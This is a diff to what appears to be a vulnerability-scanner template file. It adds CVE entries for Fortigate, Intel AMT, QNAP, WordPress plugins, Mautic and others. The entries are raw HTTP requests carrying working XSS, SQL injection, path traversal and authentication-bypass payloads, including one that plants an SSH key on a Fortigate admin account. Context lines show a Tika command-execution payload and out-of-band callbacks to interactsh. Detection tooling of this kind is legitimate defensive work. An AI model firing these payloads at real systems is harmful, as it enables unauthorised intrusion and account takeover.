@@ -5945,6 +5945,21 @@
       ]
     },
     {
+      "id": "CVE-2017-5689",
+      "info": {
+        "name": "Intel Active Management Technology - Authentication Bypass",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET / HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /hw-sys.htm HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2017-5982",
       "info": {
         "name": "Kodi 17.1 - Local File Inclusion",
@@ -6771,11 +6786,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
-            "Content-type": "image/jp2"
+            "Content-type": "image/jp2",
+            "Connection": "close",
+            "X-Tika-OCRTesseractPath": "cscript"
           },
           "method": "PUT",
           "path": [
@@ -7489,6 +7504,21 @@
           "raw": [
             "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nnew_username={{username}}&new_password={{password}}\n",
             "GET /assets/edit/ip-address.php?ipid=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&del=1 HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-19287",
+      "info": {
+        "name": "Ninja Forms <= 3.3.17 - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In\n",
+            "GET /wp-admin/edit.php?s&post_status=all&post_type=nf_sub&action=-1&form_id=1&nf_form_filter&begin_date=\"><img+src%3Dx+onerror%3Dalert%28document.domain%29%3B%2F%2F&end_date&filter_action=Filter&paged=1&action2=-1 HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -9593,6 +9623,21 @@
       ]
     },
     {
+      "id": "CVE-2019-18957",
+      "info": {
+        "name": "Microstrategy Library before 11.1.3 XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/MicroStrategyLibrary/auth/ui/loginPage?loginMode=alert(document.domain)"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2019-19134",
       "info": {
         "name": "WordPress Hero Maps Premium <=2.2.1 - Cross-Site Scripting",
@@ -10319,8 +10364,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "X-Atlassian-Token": "no-check",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "X-Atlassian-Token": "no-check"
           },
           "method": "POST",
           "path": [
@@ -12279,9 +12324,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
           },
           "method": "POST",
           "path": [
@@ -15378,6 +15423,21 @@
       ]
     },
     {
+      "id": "CVE-2021-24940",
+      "info": {
+        "name": "Persian Woocommerce < 5.9.8 - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1\n",
+            "GET /wp-admin/admin.php?page=persian-wc&s=xxxxx%22+accesskey%3DX+onclick%3Dalert%281%29+test%3D%22 HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-24947",
       "info": {
         "name": "WordPress Responsive Vector Maps < 6.4.2 - Arbitrary File Read",
@@ -16028,6 +16088,21 @@
           "raw": [
             "GET /solr/admin/cores?wt=json HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nConnection: close\n",
             "GET /solr/{{core}}/replication/?command=fetchindex&masterUrl=https://interact.sh HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nConnection: close\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-27909",
+      "info": {
+        "name": "Mautic - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/passwordreset?bundle=';alert(document.domain);var+ok='"
           ]
         }
       ]
@@ -18014,6 +18089,23 @@
       ]
     },
     {
+      "id": "CVE-2021-41432",
+      "info": {
+        "name": "FlatPress 1.2.1 - Cross-site scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarykGJmx9vKsePrMkVp\n\n------WebKitFormBoundarykGJmx9vKsePrMkVp\nContent-Disposition: form-data; name=\"user\"\n\n{{username}}\n------WebKitFormBoundarykGJmx9vKsePrMkVp\nContent-Disposition: form-data; name=\"pass\"\n\n{{password}}\n------WebKitFormBoundarykGJmx9vKsePrMkVp\nContent-Disposition: form-data; name=\"submit\"\n\nLogin\n------WebKitFormBoundarykGJmx9vKsePrMkVp--\n",
+            "GET /admin.php?p=entry&action=write HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /admin.php?p=entry&action=write HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n_wpnonce={{nonce}}&_wp_http_referer=%2Fadmin.php%3Fp%3Dentry%26action%3Dwrite&subject=abcd&timestamp=&entry=&attachselect=--&imageselect=--&content=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&save=Publish\n",
+            "GET /index.php/2022/10 HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-41467",
       "info": {
         "name": "JustWriting  -  Cross-Site Scripting",
@@ -19273,6 +19365,20 @@
       ]
     },
     {
+      "id": "CVE-2022-0434",
+      "info": {
+        "name": "Page Views Count < 2.4.15 - Unauthenticated SQL Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /?rest_route=/pvc/v1/increase/1&post_ids=0)%20union%20select%20md5({{num}}),null,null%20--%20g HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-0437",
       "info": {
         "name": "karma-runner DOM-based Cross-Site Scripting",
@@ -19314,6 +19420,23 @@
           "raw": [
             "GET / HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n",
             "POST /index.php/backend_api/ajax_get_calendar_events HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\n\ncsrfToken={{csrf_token}}&startDate=2022-01-01&endDate=2022-01-01\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-0535",
+      "info": {
+        "name": "E2Pdf < 1.16.45 - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In\n",
+            "GET /wp-admin/admin.php?page=e2pdf-settings HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /wp-admin/admin.php?page=e2pdf-settings HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n_nonce={{nonce}}&e2pdf_user_email=&e2pdf_api=api.e2pdf.com&e2pdf_connection_timeout=300&e2pdf_processor=0&e2pdf_dev_update=0&e2pdf_url_format=siteurl&e2pdf_mod_rewrite=0&e2pdf_mod_rewrite_url=e2pdf%2F%25uid%25%2F&e2pdf_cache=0&e2pdf_cache=1&e2pdf_cache_fonts=0&e2pdf_cache_fonts=1&e2pdf_debug=0&e2pdf_hide_warnings=0&e2pdf_images_remote_request=0&e2pdf_images_timeout=30&e2pdf_revisions_limit=3&e2pdf_memory_time=0&e2pdf_developer=0&e2pdf_developer_ips=%3C%2Ftextarea%3E%3Csvg%2Fonload%3Dalert%28document.domain%29%3E&submit=Save+Changes\n",
+            "GET /wp-admin/admin.php?page=e2pdf-settings HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -20786,6 +20909,21 @@
       ]
     },
     {
+      "id": "CVE-2022-27593",
+      "info": {
+        "name": "QNAP QTS Photo Station External Reference",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/photo/combine.php?type=javascript&g=core-r7rules/../../../hello.php."
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-27849",
       "info": {
         "name": "WordPress Simple Ajax Chat <20220116 - Sensitive Information Disclosure vulnerability",
@@ -22183,6 +22321,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}//interactsh.com%2f.."
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-40684",
+      "info": {
+        "name": "Fortigate - Authentication bypass",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /api/v2/cmdb/system/admin HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Node.js\nForwarded: by=\"[127.0.0.1]:1337\";for=\"[127.0.0.1]:1337\";proto=http;host=\nX-Forwarded-Vdom: root\n",
+            "PUT /api/v2/cmdb/system/admin/admin HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Report Runner\nContent-Type: application/json\nForwarded: for=[127.0.0.1]:8000;by=[127.0.0.1]:9000;\nContent-Length: 610\n\n{\n   \"ssh-public-key1\":\"{{randstr}}\"\n}\n"
           ]
         }
       ]
